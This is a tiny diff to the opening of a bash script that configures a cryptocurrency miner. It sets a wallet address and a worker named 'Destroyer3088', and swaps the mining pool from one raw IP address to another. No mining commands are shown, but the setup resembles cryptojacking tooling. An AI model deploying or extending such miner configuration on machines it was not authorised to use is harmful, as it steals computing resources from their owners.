@@ -1,6 +1,6 @@
 #!/bin/bash
 WALLET="4AVDqZyeuTeDgVeASR83DRdokorjq8sgkav7NcQB66hZR2kDgF5rPpyPWSv1RjpjbrXZQaQPmqpzoUFRPfD9PgFFSckTFkj"
-POOL="185.132.53.3:2222"
+POOL="31.97.58.247:8080"
 WORKER="Destroyer3088"
 
 echo "[+] Starting setup..."
